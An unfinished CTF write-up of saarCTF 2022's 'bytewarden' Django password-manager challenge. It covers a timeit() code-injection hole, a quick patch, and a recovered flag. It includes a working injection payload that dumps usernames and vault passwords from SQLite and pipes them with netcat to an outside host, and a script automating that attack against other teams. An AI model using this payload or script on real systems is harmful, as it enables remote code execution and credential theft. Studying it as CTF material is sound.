# saarCTF 2022: bytewarden

TODO
Participant: Dosenpfand

## TL;DR / Short Summary

A web challenge, consisting of a Django application that implements a password manager where 2 exploitable vulnerabilities where present.

## Task Description

Provide a task description containing all the basic information:

* Goal of the task
* General type of task (web application, cryptography, ...)
* Available resources (source code, binary-only, network service, ...)
* Any hints provided by the organizers or you might noticed in the task description
* ...

## Analysis Steps
Note: This write-up is only focuses on only one vulnerability of the application. There are at least three other ones, two of them described in the [official saarCTF git repo](https://github.com/saarsec/saarctf-2022/tree/master/bytewarden/exploits) and one of them described in a write-up by my teammates.


TODO: Explain your analysis in detail. Cover all the technical aspects, including the used tools and commands. Mention other collaborators and distinguish contributions.
TODO: where are the flags placed

We started to analyze the service by skimming through the source code files. As none of us had any previous experience with Django it proofed difficult to spot unusual code parts. However, after some digging, we found a suspicious function in the `TimingMiddleware` class in the file [`bytewarden/bytewarden/utils.py`](https://github.com/saarsec/saarctf-2022/blob/1cdae5252e5b702f07833df0104dbe39751d8670/bytewarden/service/bytewarden/bytewarden/utils.py#L39):

```python
def process_template_response(self, request, response):

    if not request.user.is_authenticated or not DEBUG:
        return response

    if not response.get("DebugStats") and request.POST.get("2fa_code"):

        # TODO add in more places
        setup = \
        "from vault.utils import two_factor_match\n"\
        + f"u_code = '{request.user.code}'\n"\
        + f"p_code = '{request.POST.get('2fa_code')}'"

        diff = timeit("two_factor_match(u_code, p_code)", setup = setup, timer = thread_time_ns, number=10000)

        response["DebugStats"] = \
            f"Date and Time: {datetime.now().strftime('%Y-%m-%d, %H:%M:%S')};"\
            + f"Password Check: {diff}ns;"\
            + f"User: {request.user.username}, last login {request.user.last_login}, date joined {request.user.date_joined}"
```

We suspected that this function allowed remote code execution to logged-in users: The [`timeit()`](https://docs.python.org/3/library/timeit.html) function executes the string passed as `setup` parameter as Python code. This string is partly controlled by the user via the HTTP post parameter `2fa_code`.

We deployed a quick and dirty fix by sanitizing the user input to the `setup` parameter to only allow digit characters:

```python
setup = \
"from vault.utils import two_factor_match\n"\
+ f"u_code = '{filter(str.isdigit, request.user.code)}'\n"\
+ f"p_code = '{filter(str.isdigit, request.POST.get('2fa_code'))}'"
```

To exploit the issue ourselves we reused a code snippet that another team was using to steal out flag and therefore ended up in our logs:

```python
';__import__('os').system('sqlite3 db.sqlite3 "select username, vault.password from users_customuser user, vault_password vault where vault.user_id = user.id order by vault.id desc limit 10" | nc 10.32.66.146 10000');'
```

It executes the `sqlite` binary, selects username and vault password sorted by the newest vaults, pipes the resulting output into netcat which sends it to our server, started via `ncat -k -l 10000`. After trying it out by manually inserting the aforementioned exploit into the two factor field of the web form our local netcat received and printed the following data.

```
CuteDifficultLocket3883|EDQ1Nz8cESUoIjQlNQ0+JwVSM2ZUC3sLQAYhN1o2FhtUNypNKxI=
RomanticExultantPtarmigan3034|AS4sMxUBDiAEOTQlNSA/Nyc3OSo6MxBQIXxxX2szVzUTNhkAUzg=
BlueeyedHardtofindPropane1420|ES00Nx4MNCcJIDMtNS43Kiw0OkM7Qg1fClUNCgcpCQEcERtXJTU=
PriceyUnaccountableMud2896|AzMoMR4MFC0gIiImNC8lIikcIjsfK21Lf1wxNTsyDRYkLTAwLBI=
LateChunkyTurtle8543|HyA1NzgcAi0qOBU8MzU9JEt0QnV5AgQnEj8RCBI7MzM6PgEMdkg=
RusticSquareGauntlet7917|ATQyJhIXNDI0IDMsBiAkLT4bJjNfaxxGABkQBS87KRIGNigRIRw=
FineGullibleCarload4076|FSgvNzwBPS8oIy0sAiAjLl44N2B6RFcjPxdXBjoJAlonKSEpMA8=
WetCarelessCappelletti2559|BCQ1ERoGJC8kMjIKIDEhITs0KDsmKlpQBXgZASItCTdTP1YAOT4=
```

TODO: link to source code?
The passwords are saved obfuscated in the database by XORing them with the associated username and then base64 encoding the result. To reverse the obfuscation we used a [Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'CuteDifficultLocket3883'%7D,'Standard',false)&input=RURRMU56OGNFU1VvSWpRbE5RMCtKd1ZTTTJaVUMzc0xRQVloTjFvMkZodFVOeXBOS3hJPQ) and got the flag which we submitted successfully.

**Flag: `SAAR{uwCAAAIAAQDn7GUl3HH5rDs3Ppr7BF9g}`**

As the manual exploit and flag submission is not feasible to do for all opposing teams every tick we tried to automate the process next. We wrote a small Python script to get started.

```python
import sys
import requests
import string
import random

ip = next(iter(sys.argv[1:2]), '10.32.109.2')
timeout = 60
HOST = f'http://{ip}:1984'
letters = string.ascii_lowercase
username_pw = ''.join(random.choice(letters) for i in range(20))

s = requests.Session()
s.post( f'{HOST}/users/signup/', data={"username": username_pw, "password1": username_pw}, verify=False, timeout=timeout)
s.post(f'{HOST}/users/login/', data={"username": username_pw, "password": username_pw}, verify=False, timeout=timeout)
resp = s.get(f'{HOST}/vault/', verify=False, timeout=timeout)
twofa_code = "';__import__('os').system('sqlite3 db.sqlite3 \"select username, vault.password from users_customuser " \
             "user, vault_password vault where vault.user_id = user.id order by vault.id desc limit 10\" | nc " \
             "10.32.66.146 10000');'"
resp = s.post(HOST + "/vault/", verify=False, timeout=timeout, data={'2fa_code': twofa_code})
print(resp.text)
```

It first registers a new user on the opposing teams instance, then logs in and finally submits the vault form including the exploit in the `2fa_code` field. Unfortunately, shortly after we were able to successfully test this first automation step, another team took all instances completely offline that did not yet patch this RCE vulnerability.
TODO: how it finished

TODO: Note, other explots, link to repo

## Vulnerabilities / Exploitable Issue(s)

List (potential) security issues you discovered in the scope of the task and how they could be exploited.

## Solution

Provide a clean (i.e., without analysis and research steps) guideline to get from the task description to the solution. If you did not finish the task, take your most promising approach as a goal.

## Failed Attempts

Describe attempts apart from the solution above which you tried. Recap and try to explain why they did not work.

## Alternative Solutions

If you can think of an alternative solution (or there are others already published), compare your attempts with those.

## Lessons Learned

TODO: Document what you learned during the competition.
TODO: More stressful than jeopardy, hard to fix and exploit in parallel, harder than expected to automate the exploit

## References

TODO: List external resources (academic papers, technical blogs, CTF writeups, ...) you used while working on this task.

* [saarCTF official git repo](https://github.com/saarsec/saarctf-2022/)
* [Python timeit() documentation](https://docs.python.org/3/library/timeit.html)
